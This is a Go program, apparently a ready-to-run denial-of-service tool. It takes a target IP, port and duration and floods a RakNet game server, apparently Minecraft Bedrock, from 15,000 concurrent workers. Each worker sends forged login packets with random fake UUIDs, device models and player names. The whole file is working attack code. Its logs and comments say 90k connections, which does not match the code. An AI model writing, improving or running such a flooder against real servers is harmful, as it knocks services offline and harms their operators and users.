package main

import (
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/sandertv/go-raknet"
	"github.com/sirupsen/logrus"
)

var (
	mu          sync.Mutex
	connId      int
	activeConns int
	log         = logrus.New()
	target      string
)

func main() {
	rand.Seed(time.Now().UnixNano())
	log.Formatter = &logrus.TextFormatter{ForceColors: true}
	log.Infoln("RakNet Flood - 90k Conexiones")

	if len(os.Args) != 4 {
		log.Fatal("Uso: go run raknet.go <ip> <port> <time>")
	}

	ip := os.Args[1]
	port := os.Args[2]
	timeStr := os.Args[3]

	target = ip + ":" + port
	duration, err := strconv.Atoi(timeStr)
	if err != nil {
		log.Fatal("Tiempo debe ser número")
	}

	log.Infof("Iniciando ataque a %s por %ds con 90k conexiones", target, duration)

	// Lanzar 90,000 workers
	const maxConn = 15000
	for i := 0; i < maxConn; i++ {
		go botWorker(i)
		if i%1000 == 0 {
			log.Infof("Lanzados %d/%d workers", i, maxConn)
		}
		time.Sleep(time.Millisecond * 1)
	}

	// Esperar el tiempo especificado
	time.Sleep(time.Duration(duration) * time.Second)

	log.Info("Tiempo terminado - Cerrando conexiones")
	os.Exit(0)
}

func botWorker(id int) {
	for {
		mu.Lock()
		if activeConns >= 15000 {
			mu.Unlock()
			time.Sleep(time.Millisecond * 100)
			continue
		}
		activeConns++
		mu.Unlock()

		err := createConn(id)
		if err != nil {
			mu.Lock()
			activeConns--
			mu.Unlock()
			time.Sleep(time.Millisecond * 500)
			continue
		}

		mu.Lock()
		activeConns--
		mu.Unlock()
		time.Sleep(time.Millisecond * 200)
	}
}

func createConn(t int) error {
	conn, err := raknet.Dial(target)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Enviar login inmediatamente
	if err := sendLogin(conn); err != nil {
		return err
	}

	connId++
	return nil
}

func sendLogin(conn *raknet.Conn) error {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.BigEndian, int32(81))

	randID := rand.Int63()
	fakeUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", rand.Uint32(), rand.Intn(0xffff), rand.Intn(0xffff), rand.Intn(0xffff), rand.Int63())

	modelos := []string{"SM-G950F", "iPhone10,3", "Pixel 2 XL", "Nexus 5X"}
	modelo := modelos[rand.Intn(len(modelos))]
	nombre := fmt.Sprintf("zJ_%d", rand.Intn(99999))

	chain := fmt.Sprintf(`{"chain":["{\"extraData\":{\"displayName\":\"%s\",\"identity\":\"%s\"}}"]}`, nombre, fakeUUID)
	client := fmt.Sprintf(`{"ClientRandomId":%d,"DeviceOS":1,"DeviceId":"%s","DeviceModel":"%s"}`, randID, fakeUUID, modelo)

	binary.Write(buf, binary.BigEndian, int32(len(chain)))
	buf.WriteString(chain)
	binary.Write(buf, binary.BigEndian, int32(len(client)))
	buf.WriteString(client)

	loginData := buf.Bytes()
	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	inner := append([]byte{0x01}, loginData...)

	v := uint32(len(inner))
	for v >= 0x80 {
		b.WriteByte(byte(v) | 0x80)
		v >>= 7
	}
	b.WriteByte(byte(v))

	w.Write(inner)
	w.Close()

	final := append([]byte{0xfe}, make([]byte, 4)...)
	binary.BigEndian.PutUint32(final[1:5], uint32(len(inner)))
	final = append(final, b.Bytes()...)

	_, err := conn.Write(final)
	return err
}
